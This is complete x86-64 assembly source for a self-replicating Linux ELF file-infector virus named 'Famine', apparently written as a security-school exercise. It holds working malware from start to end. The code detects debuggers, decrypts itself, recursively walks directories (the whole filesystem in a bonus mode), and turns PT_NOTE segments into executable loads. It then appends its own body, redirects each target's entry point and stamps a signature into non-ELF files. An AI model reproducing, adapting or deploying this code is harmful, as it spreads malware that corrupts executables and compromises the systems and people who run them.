; ============================================
; VIRUS PAYLOAD - tout ce qui est contenu entre virus_start & virus_end 
;                 sera copie dans les pt_load des binaires cibles
; ============================================

virus_start:
original_entry_storage:
    dq 0                        
encryption_key:
    db "0000000000000000"        
encrypted_flag:
    db 0
encrypted_offset:
    dq 0                        
encrypted_size:
    dq 0                        

_start:
    ; Save all registers we'll use
    push rbp
    mov rbp, rsp
    push rbx
    push r12
    push r13
    push r14
    push r15
    ; ============================================
    ; ANTI-DEBUGGING CHECK
    ; Use ptrace(PTRACE_TRACEME) to detect debugger
    ; Returns -1 (EPERM) if already being traced
    ; ============================================
    mov eax, SYS_PTRACE
    mov edi, PTRACE_TRACEME
    xor esi, esi
    xor edx, edx
    xor r10d, r10d
    syscall
    
    ; If ptrace returns -1, we're being debugged
    cmp rax, -1
    je .being_debugged
    ; ============================================
    ; DECRYPTION CHECK AND ROUTINE
    ; Check if code is encrypted and decrypt if needed
    ; ============================================
    ; Get base address for decryption
    call .get_decrypt_base
.get_decrypt_base:
    pop r15
    sub r15, .get_decrypt_base - virus_start
    
    ; Check encrypted flag
    movzx eax, byte [r15 + encrypted_flag - virus_start]
    test al, al
    jz .not_encrypted           ; If 0, code is not encrypted
    
    ; Decrypt the virus code
    ; Read encrypted offset (from virus_start) and size
    mov rax, [r15 + encrypted_offset - virus_start]
    mov rsi, [r15 + encrypted_size - virus_start]
    
    ; Calculate buffer address: virus_start + offset
    add rax, r15                ; rax = r15 + offset = buffer address
    mov rdi, rax
    
    ; Make .text section writable using mprotect
    ; mprotect(addr, len, PROT_READ | PROT_WRITE | PROT_EXEC)
    ; We need to align addr to page boundary (4096 bytes)
    push rdi                    ; Save buffer address
    push rsi                    ; Save size
    
    ; Align address down to page boundary
    mov rax, rdi
    and rax, ~0xfff             ; Clear lower 12 bits (4K alignment)
    mov rdi, rax                ; rdi = aligned address
    
    ; Calculate size to cover the encrypted region
    pop rax                     ; Get size back
    add rax, 0x1000             ; Add one page to ensure we cover everything
    mov rsi, rax                ; rsi = size
    
    ; Set permissions: PROT_READ | PROT_WRITE | PROT_EXEC = 1 | 2 | 4 = 7
    mov edx, 7
    mov eax, SYS_MPROTECT
    syscall
    
    pop rdi                     ; Restore buffer address
    mov rsi, [r15 + encrypted_size - virus_start]  ; Restore size
    
    ; Get encryption key
    lea rdx, [r15 + encryption_key - virus_start]
    mov rcx, 16                 ; key size
    call decrypt_code
    
    ; Clear encrypted flag so we don't decrypt again
    mov byte [r15 + encrypted_flag - virus_start], 0
    
.not_encrypted:
    ; Re-get base address since r15 might have been modified
    call .get_base_after_decrypt
.get_base_after_decrypt:
    pop r15
    sub r15, .get_base_after_decrypt - virus_start



    ; Get base address using RIP-relative call trick
    call .get_base
.get_base:
    pop r15                     ; r15 = address of .get_base label
    sub r15, .get_base - virus_start  ; r15 = base address of virus_start

    ; Check if original_entry_storage is 0 (we're the original Famine binary)
    mov rax, [r15 + original_entry_storage - virus_start]
    test rax, rax
    jnz .run_as_virus           ; if not zero, we're running as virus in infected binary

    ; ===== ORIGINAL FAMINE BINARY EXECUTION PATH =====
    ; When running as original famine binary, use normal data sections
    
    ; Check if "test" process is running
    call check_process_running
    test rax, rax
    jnz _end                    ; If "test" process is running, exit without doing anything
    
    mov qword [rel file_count], 0
    
%ifdef VERBOSE_MODE
    lea rsi, [rel firstDir]     ; source = /tmp/test
    lea rdi, [rel path_buffer]
    call print_string
%endif
    lea rsi, [rel firstDir]     ; source = /tmp/test
    lea rdi, [rel path_buffer]
    call str_copy
    lea rdi, [rel path_buffer]
    call list_files_recursive
    
    lea rdi, [rel file_list]
    mov rsi, [rel file_count]
    call check_elf64_exec
    
    lea rsi, [rel secondDir]    ; source = /tmp/test2
    lea rdi, [rel path_buffer]
    call str_copy
    lea rdi, [rel path_buffer]
    call list_files_recursive
    
    lea rdi, [rel file_list]
    mov rsi, [rel file_count]
    call check_elf64_exec
    
    jmp _end

.being_debugged:
    ; Print "DEBUGGING.." message
    mov eax, SYS_WRITE
    mov edi, STDOUT
    lea rsi, [rel msg_debugging]
    mov edx, 12                 
    syscall
    
    ; Exit the program
    mov eax, SYS_EXIT
    xor edi, edi                ; exit code 0
    syscall

; ============================================
; decrypt_code - Decrypt buffer with XOR and rotation
; No push/pop in loop, use only registers
; ============================================
decrypt_code:
    push rbp
    mov rbp, rsp
    push rbx
    push r8
    push r9
    push r12
    push r13
    push r14
    push r15
    
    mov r12, rdi        ; buffer
    mov r13, rsi        ; size
    mov r14, rdx        ; key
    mov r15, rcx        ; keysize (16)
    
    xor rbx, rbx
    xor r8, r8
    xor r9, r9
    
.loop:
    cmp rbx, r13
    jge .done
    
    ; Load byte and rotate
    xor r8, r8
    mov r8b, [r12 + rbx]
    ror r8b, 3
    
    ; Get key index via modulo
    mov rax, rbx
    xor rdx, rdx
    div r15             ; Use r15 (keysize) instead of hardcoded 16
    ; rdx = rbx % keysize
    
    ; XOR with key
    xor r9, r9
    mov r9b, [r14 + rdx]
    xor r8b, r9b
    
    ; Store
    mov [r12 + rbx], r8b
    
    inc rbx
    jmp .loop
    
.done:
    pop r15
    pop r14
    pop r13
    pop r12
    pop r9
    pop r8
    pop rbx
    mov rsp, rbp
    pop rbp
    ret

.end:
; ============================================
; END OF DECRYPTION CODE  
; Everything after this label will be encrypted
; ============================================

_start.run_as_virus:
    ; ===== VIRUS EXECUTION PATH IN INFECTED BINARY =====
    ; We're running as the virus payload in an infected binary
    ; We need to use stack-based buffers and position-independent code
    
    ; Check if "test" process is running (before infecting anything)
    call virus_check_process_running
    test rax, rax
    jnz .virus_skip_to_original ; If "test" process is running, skip infection and go to original entry
    
    ; The stored value is the offset from our _start to the original entry
    ; Calculate actual original entry: current_rip + stored_offset
    ; Get current location of _start
    call .get_start_rip
.get_start_rip:
    pop rax                     ; rax = address of .get_start_rip
    sub rax, .get_start_rip - _start  ; rax = actual address of _start
    
    ; Add the stored offset to get original entry
    add rax, [r15 + original_entry_storage - virus_start]
    push rax                    ; save original entry point at bottom of our stack
    
    ; Allocate stack space for our buffers
    sub rsp, VIRUS_STACK_SIZE
    and rsp, ~15                ; 16-byte align

    ; For simplicity in virus mode, just do a minimal infection attempt
    ; Initialize file_count on stack
    mov qword [rsp], 0
    
    ; Build path on stack: "/tmp/test"
    lea rdi, [rsp + 8]          ; path buffer
    lea rsi, [r15 + v_firstDir - virus_start]  ; virus embedded string
    call virus_str_copy
    
    ; List files in directory
    lea rdi, [rsp + 8]          ; path buffer
    lea rsi, [rsp]              ; file count pointer
    lea rdx, [rsp + 4104]       ; file list buffer
    call virus_list_and_infect

%ifndef BONUS_MODE
    ; Also process /tmp/test2 directory
    lea rdi, [rsp + 8]          ; path buffer
    lea rsi, [r15 + v_secondDir - virus_start]  ; virus embedded string
    call virus_str_copy
    
    ; List files in directory
    lea rdi, [rsp + 8]          ; path buffer
    lea rsi, [rsp]              ; file count pointer
    lea rdx, [rsp + 4104]       ; file list buffer
    call virus_list_and_infect
%endif

    ; Restore to original stack frame
    mov rsp, rbp
    
    ; Pop original entry point into rax
    ; Stack layout from rbp: [saved_rbp][rbx][r12][r13][r14][r15][orig_entry]
    ; rbp points to saved_rbp, so orig_entry is at rbp-48 (6 items * 8 bytes)
    mov rax, [rbp - 48]         ; get original entry point we pushed earlier
    
    jmp .virus_jump_to_original

.virus_skip_to_original:
    ; "test" process is running, skip infection and go directly to original entry
    ; Calculate original entry point
    call .get_skip_start_rip
.get_skip_start_rip:
    pop rax                     ; rax = address of .get_skip_start_rip
    sub rax, .get_skip_start_rip - _start  ; rax = actual address of _start
    add rax, [r15 + original_entry_storage - virus_start]

.virus_jump_to_original:
    ; Restore stack properly - just restore to the value at function entry
    pop rbp                     ; restore original rbp
    
    ; Clear registers to provide clean state (like kernel does)
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx
    xor rcx, rcx
    xor r8, r8
    xor r9, r9
    xor r10, r10
    xor r11, r11
    ; Don't clear rsp, rbp, or rax (entry point)
    
    ; Jump to original entry point
    jmp rax

; ============================================
; Embedded virus strings (in code section for position independence)
; ============================================
%ifdef BONUS_MODE
v_firstDir:       db "/", 0
%else
v_firstDir:       db "/tmp/test", 0
%endif
%ifndef BONUS_MODE
v_secondDir:      db "/tmp/test2", 0
%endif
v_signature:      db "Famine version 1.0 (c)oded by <ocrossi>-<elaignel>", 0
v_signature_len:  equ $ - v_signature - 1
v_procdir:        db "/proc/", 0
v_proc_status:    db "/status", 0
v_proc_test_string: db "Name:	test", 10
v_proc_test_len:  equ $ - v_proc_test_string

; ============================================
; virus_str_copy - Copy string avec adresses relatives
; rdi = destination
; rsi = source
; ============================================
virus_str_copy:
    push rax
.v_str_copy_loop:
    lodsb
    stosb
    test al, al
    jnz .v_str_copy_loop
    pop rax
    ret

; ============================================
; virus_str_len - Get string length avec adresses relatives
; rdi = string pointer
; Returns: rax = length
; ============================================
virus_str_len:
    push rdi
    xor rax, rax
.v_str_len_loop:
    cmp byte [rdi], 0
    je .v_str_len_done
    inc rdi
    inc rax
    jmp .v_str_len_loop
.v_str_len_done:
    pop rdi
    ret

; ============================================
; virus_search_signature - Search for signature in buffer
; rdi = haystack (buffer to search in)
; rsi = haystack_len (length of buffer)
; rdx = needle (string to search for)
; rcx = needle_len (length of needle)
; Returns: rax = 1 if found, 0 if not found
; Position-independent version for virus payload
; ============================================
virus_search_signature:
    push rbp
    mov rbp, rsp
    push r12                    ; haystack
    push r13                    ; haystack_len
    push r14                    ; needle
    push rbx                    ; current position

    mov r12, rdi                ; r12 = haystack
    mov r13, rsi                ; r13 = haystack_len
    mov r14, rdx                ; r14 = needle
    ; rcx already has needle_len

    ; If needle is longer than haystack, not found
    cmp rcx, r13
    ja .vss_not_found

    xor rbx, rbx                ; rbx = current position in haystack

.vss_loop:
    ; Check if we have enough bytes left
    mov rax, r13
    sub rax, rbx                ; bytes remaining
    cmp rax, rcx
    jb .vss_not_found           ; not enough bytes left

    ; Compare needle with current position in haystack
    push rcx                    ; save needle_len
    lea rdi, [r12 + rbx]        ; current position in haystack
    mov rsi, r14                ; needle
    
    ; Byte-by-byte comparison
    xor rax, rax                ; match counter
.vss_compare_loop:
    cmp rax, rcx
    jge .vss_found              ; all bytes matched

    mov r8b, [rdi + rax]        ; byte from haystack
    mov r9b, [rsi + rax]        ; byte from needle
    cmp r8b, r9b
    jne .vss_next               ; mismatch, try next position

    inc rax
    jmp .vss_compare_loop

.vss_next:
    pop rcx                     ; restore needle_len
    inc rbx                     ; try next position
    jmp .vss_loop

.vss_found:
    pop rcx                     ; restore needle_len
    mov rax, 1                  ; found
    jmp .vss_done

.vss_not_found:
    xor rax, rax                ; not found

.vss_done:
    pop rbx
    pop r14
    pop r13
    pop r12
    mov rsp, rbp
    pop rbp
    ret

; ============================================
; virus_check_process_running()
; Checks if a process named "test" is running
; r15 = virus base address (preserved)
; Returns: rax = 1 if "test" process is running, 0 otherwise
; Position-independent version for virus payload
; ============================================
virus_check_process_running:
    push rbp
    mov rbp, rsp
    push r12                    ; proc fd
    push r13                    ; status fd
    push r14                    ; saved r15
    push rbx
    sub rsp, 512                ; Stack space for buffers (AFTER pushes)

    mov r14, r15                ; Save r15 (virus base)
    xor rbx, rbx                ; process found flag = 0

    ; Open /proc directory
    mov eax, SYS_OPENAT
    mov edi, AT_FDCWD
    lea rsi, [r15 + v_procdir - virus_start]
    mov edx, O_RDONLY | O_DIRECTORY
    xor r10d, r10d
    syscall

    test rax, rax
    js .vcheck_proc_done        ; Failed to open /proc

    mov r12, rax                ; Save /proc fd

.vcheck_proc_read_loop:
    ; Read directory entries
    mov eax, SYS_GETDENTS64
    mov edi, r12d
    lea rsi, [rsp]              ; Buffer at rsp (after stack allocation)
    mov edx, 512
    syscall

    test rax, rax
    jle .vcheck_proc_close      ; EOF or error

    mov [rbp-8], rax            ; Save bytes read
    mov qword [rbp-16], 0       ; pos = 0

.vcheck_proc_process_entry:
    mov rax, [rbp-16]
    cmp rax, [rbp-8]
    jge .vcheck_proc_read_loop

    lea rdi, [rsp]
    add rdi, rax                ; dirent pointer

    ; Get d_reclen
    movzx ecx, word [rdi + 16]
    mov [rbp-24], rcx

    ; Get d_name
    lea rsi, [rdi + 19]

    ; Check if d_name is numeric (process directory)
    movzx eax, byte [rsi]
    cmp al, '0'
    jb .vcheck_proc_next_entry
    cmp al, '9'
    ja .vcheck_proc_next_entry

    ; Build path: /proc/[pid]/status
    lea rdi, [rsp+256]          ; path buffer
    lea rsi, [r14 + v_procdir - virus_start]
    call virus_str_copy         ; Copy "/proc/"
    
    lea rdi, [rsp+256]
    call virus_str_len
    lea rdi, [rsp+256]
    add rdi, rax
    lea rsi, [rsp]
    mov rax, [rbp-16]
    add rsi, rax
    add rsi, 19                 ; d_name
    call virus_str_copy         ; Copy pid
    
    ; Append "/status"
    lea rdi, [rsp+256]
    call virus_str_len
    lea rdi, [rsp+256]
    add rdi, rax
    lea rsi, [r14 + v_proc_status - virus_start]
    call virus_str_copy

    ; Open status file
    mov eax, SYS_OPENAT
    mov edi, AT_FDCWD
    lea rsi, [rsp+256]
    xor edx, edx                ; O_RDONLY
    xor r10d, r10d
    syscall

    test rax, rax
    js .vcheck_proc_next_entry  ; Failed to open status file

    mov r13, rax                ; Save status fd

    ; Read status file (first 128 bytes should be enough)
    mov eax, SYS_READ
    mov edi, r13d
    lea rsi, [rsp+128]          ; status buffer
    mov edx, 128
    syscall

    mov [rbp-32], rax           ; Save bytes read

    ; Close status file
    mov eax, SYS_CLOSE
    mov edi, r13d
    syscall

    cmp qword [rbp-32], 0
    jle .vcheck_proc_next_entry

    ; Search for "Name:\ttest\n" in status buffer
    lea rdi, [rsp+128]
    mov rsi, [rbp-32]           ; bytes read
    lea rdx, [r14 + v_proc_test_string - virus_start]
    mov rcx, v_proc_test_len
    call virus_search_signature

    test rax, rax
    jz .vcheck_proc_next_entry

    ; Found "test" process!
    mov rbx, 1
    jmp .vcheck_proc_close

.vcheck_proc_next_entry:
    mov rax, [rbp-16]
    add rax, [rbp-24]
    mov [rbp-16], rax
    jmp .vcheck_proc_process_entry

.vcheck_proc_close:
    mov eax, SYS_CLOSE
    mov edi, r12d
    syscall

.vcheck_proc_done:
    mov rax, rbx                ; Return process found flag
    mov r15, r14                ; Restore r15

    add rsp, 512
    pop rbx
    pop r14
    pop r13
    pop r12
    mov rsp, rbp
    pop rbp
    ret

; ============================================
; virus_list_and_infect - List files and infect ELF64 executables
; rdi = path buffer
; rsi = file count pointer
; rdx = file list buffer
; r15 = virus base address (preserved)
; ============================================
virus_list_and_infect:
    push rbp
    mov rbp, rsp
    sub rsp, 4224               ; stack space for getdents buffer and local vars
    push r12                    ; path buffer
    push r13                    ; file count ptr
    push r14                    ; file list ptr
    push rbx

    mov r12, rdi                ; save path buffer
    mov r13, rsi                ; save file count ptr  
    mov r14, rdx                ; save file list ptr

    ; Get path length
    mov rdi, r12
    call virus_str_len
    mov [rbp-8], rax            ; save path length

    ; Open directory
    mov eax, SYS_OPENAT
    mov edi, AT_FDCWD
    mov rsi, r12
    mov edx, O_RDONLY | O_DIRECTORY
    xor r10d, r10d
    syscall

    test rax, rax
    js .vl_done

    mov rbx, rax                ; save fd

.vl_read_loop:
    ; getdents64
    mov eax, SYS_GETDENTS64
    mov edi, ebx
    lea rsi, [rbp-4224]         ; buffer on stack
    mov edx, 4096
    syscall

    test rax, rax
    jle .vl_close_dir

    mov [rbp-16], rax           ; save nread
    mov qword [rbp-24], 0       ; pos = 0

.vl_process_entry:
    mov rax, [rbp-24]
    cmp rax, [rbp-16]
    jge .vl_read_loop

    lea rdi, [rbp-4224]
    add rdi, rax                ; dirent pointer

    ; Get d_reclen (offset 16)
    movzx ecx, word [rdi + 16]
    mov [rbp-32], rcx           ; save d_reclen

    ; Get d_type (offset 18)
    movzx eax, byte [rdi + 18]

    ; Get d_name (offset 19)
    lea rsi, [rdi + 19]

    ; Skip . and ..
    cmp byte [rsi], '.'
    jne .vl_not_dot
    cmp byte [rsi+1], 0
    je .vl_next_entry
    cmp byte [rsi+1], '.'
    jne .vl_not_dot
    cmp byte [rsi+2], 0
    je .vl_next_entry

.vl_not_dot:
    ; Save d_type for later use
    mov [rbp-40], rax           ; save d_type
    
    ; Build full path (needed for both files and directories)
    mov rdi, r12
    mov rax, [rbp-8]            ; path length
    add rdi, rax

    ; Add / if needed
    cmp byte [rdi-1], '/'
    je .vl_no_slash
    mov byte [rdi], '/'
    inc rdi
.vl_no_slash:
    ; rsi already points to d_name
    push rdi
    call virus_str_copy
    pop rdi

    ; Restore d_type
    mov rax, [rbp-40]
    
    ; Check if regular file (DT_REG = 8)
    cmp al, 8
    je .vl_regular_file
    
    ; Check if directory (DT_DIR = 4)
    cmp al, 4
    je .vl_directory
    
    jmp .vl_restore_path

.vl_regular_file:
    ; Try to infect this file
    mov rdi, r12
    call virus_infect_elf
    jmp .vl_restore_path

.vl_directory:
    ; Recurse into directory
    mov rdi, r12
    mov rsi, r13
    mov rdx, r14
    call virus_list_and_infect

.vl_restore_path:
    ; Restore path
    mov rax, [rbp-8]
    mov byte [r12 + rax], 0

.vl_next_entry:
    mov rax, [rbp-24]
    add rax, [rbp-32]
    mov [rbp-24], rax
    jmp .vl_process_entry

.vl_close_dir:
    mov eax, SYS_CLOSE
    mov edi, ebx
    syscall

.vl_done:
    pop rbx
    pop r14
    pop r13
    pop r12
    add rsp, 4224
    mov rsp, rbp
    pop rbp
    ret

; ============================================
; virus_infect_elf - Try to infect an ELF64 file
; rdi = file path
; r15 = virus base address (preserved)
; ============================================
virus_infect_elf:
    push rbp
    mov rbp, rsp
    sub rsp, 4096 + 128         ; Buffer for ELF header, phdrs, and local vars
    push r12                    ; file path
    push r13                    ; file descriptor
    push r14                    ; e_phoff
    push rbx

    mov r12, rdi

    ; Open file for read/write
    mov eax, SYS_OPENAT
    mov edi, AT_FDCWD
    mov rsi, r12
    mov edx, O_RDWR
    xor r10d, r10d
    syscall

    test rax, rax
    js .vi_fail

    mov r13, rax                ; fd

    ; Get file size
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor esi, esi
    mov edx, SEEK_END
    syscall

    test rax, rax
    js .vi_close_fail

    mov [rbp-8], rax            ; save file size

    ; Seek to beginning
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor esi, esi
    xor edx, edx
    syscall

    ; Read ELF header
    mov eax, SYS_READ
    mov edi, r13d
    lea rsi, [rbp-112]          ; ELF header buffer
    mov edx, 64
    syscall

    cmp rax, 64
    jl .vi_handle_non_elf

    ; Check ELF magic
    lea rdi, [rbp-112]
    cmp dword [rdi], 0x464c457f ; "\x7fELF"
    jne .vi_handle_non_elf

    ; Check ELF class (must be 64-bit)
    cmp byte [rdi+4], 2
    jne .vi_handle_non_elf

    ; Check e_type (2=ET_EXEC or 3=ET_DYN)
    movzx eax, word [rdi+16]
    cmp ax, 2
    je .vi_valid_elf_type
    cmp ax, 3
    jne .vi_handle_non_elf

.vi_valid_elf_type:
    ; ============================================
    ; Check if file is already infected by searching for signature
    ; ============================================
    ; We need to scan the file for the signature before infecting
    ; Use [rbp-4224] as a temporary read buffer (will be reused for phdrs later)
    
    mov [rbp-48], r15           ; save r15 (virus base) temporarily
    
    ; Seek to beginning
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor esi, esi
    xor edx, edx
    syscall
    
    xor rbx, rbx                ; current file position
    mov r14, [rbp-8]            ; file size

.vi_sig_check_loop:
    ; Read a chunk of the file
    mov eax, SYS_READ
    mov edi, r13d
    lea rsi, [rbp-4224]         ; buffer
    mov edx, 4096               ; read up to 4096 bytes
    syscall

    test rax, rax
    jle .vi_sig_check_done      ; EOF or error, not found

    ; Search for signature in buffer
    push rax                    ; save bytes_read
    mov r15, [rbp-48]           ; restore r15 for signature access
    lea rdi, [rbp-4224]         ; buffer
    mov rsi, rax                ; bytes_read
    lea rdx, [r15 + v_signature - virus_start]  ; signature
    mov rcx, v_signature_len    ; signature length
    call virus_search_signature
    
    pop rcx                     ; restore bytes_read into rcx
    
    ; If found, file is already infected
    test rax, rax
    jnz .vi_already_infected

    ; Update position and check if more to read
    add rbx, rcx                ; bytes read
    cmp rbx, r14                ; compare with file size
    jge .vi_sig_check_done      ; done reading

    ; Seek back slightly to handle signatures that span chunk boundaries
    mov rsi, rbx
    sub rsi, v_signature_len
    add rsi, 1
    test rsi, rsi
    js .vi_sig_check_done       ; shouldn't happen, but be safe
    
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor edx, edx                ; SEEK_SET
    syscall
    
    test rax, rax
    js .vi_sig_check_done
    
    mov rbx, rax                ; update position
    jmp .vi_sig_check_loop

.vi_already_infected:
    ; File is already infected, just close and skip
    mov r15, [rbp-48]           ; restore r15
    jmp .vi_close_fail

.vi_sig_check_done:
    ; File is not infected, proceed with infection
    mov r15, [rbp-48]           ; restore r15
    
    ; Seek back to beginning to read ELF header again
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor esi, esi
    xor edx, edx
    syscall
    
    ; Read ELF header again
    mov eax, SYS_READ
    mov edi, r13d
    lea rsi, [rbp-112]          ; ELF header buffer
    mov edx, 64
    syscall
    
    ; Re-setup ELF header pointer
    lea rdi, [rbp-112]

    ; Save original entry point
    mov rax, [rdi + 24]         ; e_entry at offset 24
    mov [rbp-16], rax

    ; Get e_phoff
    mov r14, [rdi + 32]         ; e_phoff at offset 32

    ; Get e_phentsize
    movzx eax, word [rdi + 54]
    mov [rbp-32], rax

    ; Get e_phnum
    movzx eax, word [rdi + 56]
    mov [rbp-40], rax

    ; Seek to program headers
    mov eax, SYS_LSEEK
    mov edi, r13d
    mov rsi, r14
    xor edx, edx
    syscall

    ; Read all program headers
    mov rax, [rbp-40]           ; e_phnum
    imul rax, [rbp-32]          ; * e_phentsize
    mov rdx, rax

    mov eax, SYS_READ
    mov edi, r13d
    lea rsi, [rbp-4224]         ; phdr buffer
    syscall

    ; Find PT_NOTE to convert to PT_LOAD
    lea rdi, [rbp-4224]
    xor rcx, rcx                ; index
    mov rax, [rbp-40]           ; e_phnum

.vi_find_note:
    cmp rcx, rax
    jge .vi_close_fail          ; No PT_NOTE found

    mov rdx, rcx
    imul rdx, [rbp-32]          ; * e_phentsize
    lea rsi, [rdi + rdx]

    cmp dword [rsi], PT_NOTE    ; p_type
    je .vi_found_note

    inc rcx
    jmp .vi_find_note

.vi_found_note:
    ; rsi points to the PT_NOTE phdr
    ; First, we need to find the highest vaddr in existing LOAD segments
    ; Save rsi (pointer to PT_NOTE phdr) on stack
    push rsi
    
    ; Scan all phdrs to find max vaddr + memsz
    lea rdi, [rbp-4224]         ; phdrs buffer
    xor rcx, rcx                ; index
    xor r8, r8                  ; max_vaddr_end = 0
    mov rax, [rbp-40]           ; e_phnum

.vi_find_max_vaddr:
    cmp rcx, rax
    jge .vi_found_max_vaddr

    mov rdx, rcx
    imul rdx, [rbp-32]          ; * e_phentsize
    lea rsi, [rdi + rdx]

    ; Check if this is a LOAD segment
    cmp dword [rsi], PT_LOAD
    jne .vi_next_phdr

    ; Get vaddr + memsz
    mov r9, [rsi+16]            ; p_vaddr
    add r9, [rsi+40]            ; + p_memsz
    cmp r9, r8
    jle .vi_next_phdr
    mov r8, r9                  ; update max

.vi_next_phdr:
    inc rcx
    jmp .vi_find_max_vaddr

.vi_found_max_vaddr:
    ; r8 now contains the highest vaddr + memsz
    ; We need p_vaddr to be congruent to p_offset modulo page size
    ; p_offset = file_size, so: p_vaddr % 0x1000 == file_size % 0x1000
    
    ; First, get the file size's page offset
    mov rax, [rbp-8]            ; file size
    mov r9, rax                 ; save file size in r9
    and rax, 0xfff              ; file_size % page_size
    
    ; Align r8 (max_vaddr_end) up to next page boundary, then add the offset
    add r8, 0xfff
    and r8, ~0xfff              ; page-aligned
    add r8, rax                 ; add file offset within page
    
    ; Restore rsi (pointer to PT_NOTE phdr)
    pop rsi
    
    ; Convert to PT_LOAD
    mov dword [rsi], PT_LOAD    ; p_type
    mov dword [rsi+4], PF_R | PF_W | PF_X  ; p_flags

    ; p_offset = file size
    mov [rsi+8], r9             ; use saved file size

    ; p_vaddr = properly aligned value in r8
    mov [rsi+16], r8            ; p_vaddr
    mov [rsi+24], r8            ; p_paddr
    mov [rbp-24], r8            ; save for later

    ; p_filesz and p_memsz = virus size
    mov rax, virus_end - virus_start
    mov [rsi+32], rax           ; p_filesz
    mov [rsi+40], rax           ; p_memsz

    ; p_align = 0x1000
    mov qword [rsi+48], 0x1000

    ; Write modified phdrs back
    mov eax, SYS_LSEEK
    mov edi, r13d
    mov rsi, r14                ; e_phoff
    xor edx, edx
    syscall

    mov rax, [rbp-40]           ; e_phnum
    imul rax, [rbp-32]          ; * e_phentsize
    mov rdx, rax

    mov eax, SYS_WRITE
    mov edi, r13d
    lea rsi, [rbp-4224]
    syscall

    ; Update entry point
    mov rax, [rbp-24]           ; new vaddr
    add rax, _start - virus_start  ; offset to _start
    lea rdi, [rbp-112]
    mov [rdi + 24], rax         ; e_entry

    ; Write updated ELF header
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor esi, esi
    xor edx, edx
    syscall

    mov eax, SYS_WRITE
    mov edi, r13d
    lea rsi, [rbp-112]
    mov edx, 64
    syscall

    ; Prepare virus copy with patched original entry
    ; Copy virus to temp buffer
    lea rdi, [rbp-4224]
    mov rsi, r15                ; virus_start address
    mov rcx, virus_end - virus_start
.vi_copy_virus:
    test rcx, rcx
    jz .vi_copy_done
    mov al, [rsi]
    mov [rdi], al
    inc rsi
    inc rdi
    dec rcx
    jmp .vi_copy_virus

.vi_copy_done:
    ; Patch original_entry_storage
    ; For PIE binaries, we store the offset from our _start to the original entry
    ; This way, at runtime: actual_original_entry = our_rip + stored_offset
    lea rdi, [rbp-4224]
    mov rax, [rbp-16]           ; original entry point (offset)
    mov rcx, [rbp-24]           ; our new vaddr
    add rcx, _start - virus_start  ; add offset to _start
    sub rax, rcx                ; offset = original_entry - our_entry
    mov [rdi + original_entry_storage - virus_start], rax

    ; Seek to end of file
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor esi, esi
    mov edx, SEEK_END
    syscall

    ; Write virus code
    mov eax, SYS_WRITE
    mov edi, r13d
    lea rsi, [rbp-4224]
    mov edx, virus_end - virus_start
    syscall

    ; Close file
    mov eax, SYS_CLOSE
    mov edi, r13d
    syscall

    jmp .vi_done

; ============================================
; Handle non-ELF files - check for signature and append if not present
; ============================================
.vi_handle_non_elf:
    ; File is not a valid ELF64 executable
    ; Check if it already contains the signature
    ; Seek to beginning
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor esi, esi
    xor edx, edx
    syscall
    
    xor rbx, rbx                ; current file position
    mov r14, [rbp-8]            ; file size

.vi_non_elf_sig_loop:
    ; Read a chunk of the file
    mov eax, SYS_READ
    mov edi, r13d
    lea rsi, [rbp-4224]         ; buffer on stack
    mov edx, 4096
    syscall

    test rax, rax
    jle .vi_non_elf_append      ; EOF or error, signature not found

    ; Search for signature in buffer
    push rax                    ; save bytes_read
    lea rdi, [rbp-4224]         ; buffer
    mov rsi, rax                ; bytes_read
    lea rdx, [r15 + v_signature - virus_start]  ; signature
    mov rcx, v_signature_len    ; signature length
    call virus_search_signature
    
    pop rcx                     ; restore bytes_read into rcx
    
    ; If found, file already has signature
    test rax, rax
    jnz .vi_close_fail          ; skip - already has signature

    ; Update position and check if more to read
    add rbx, rcx                ; bytes read
    cmp rbx, r14                ; compare with file size
    jge .vi_non_elf_append      ; done reading, append signature

    ; Seek back slightly to handle signatures that span chunk boundaries
    mov rsi, rbx
    sub rsi, v_signature_len
    add rsi, 1
    test rsi, rsi
    js .vi_non_elf_append       ; shouldn't happen, but be safe
    
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor edx, edx                ; SEEK_SET
    syscall
    
    test rax, rax
    js .vi_non_elf_append
    
    mov rbx, rax                ; update position
    jmp .vi_non_elf_sig_loop

.vi_non_elf_append:
    ; Append the signature to the file
    ; Seek to end of file
    mov eax, SYS_LSEEK
    mov edi, r13d
    xor esi, esi
    mov edx, SEEK_END
    syscall
    
    ; Write the signature
    mov eax, SYS_WRITE
    mov edi, r13d
    lea rsi, [r15 + v_signature - virus_start]
    mov edx, v_signature_len
    syscall
    
    ; Close file and done
    jmp .vi_close_fail

.vi_close_fail:
    mov eax, SYS_CLOSE
    mov edi, r13d
    syscall

.vi_fail:
.vi_done:
    pop rbx
    pop r14
    pop r13
    pop r12
    add rsp, 4096 + 128
    mov rsp, rbp
    pop rbp
    ret

; ============================================
; VIRUS CODE END
; ============================================
virus_end:
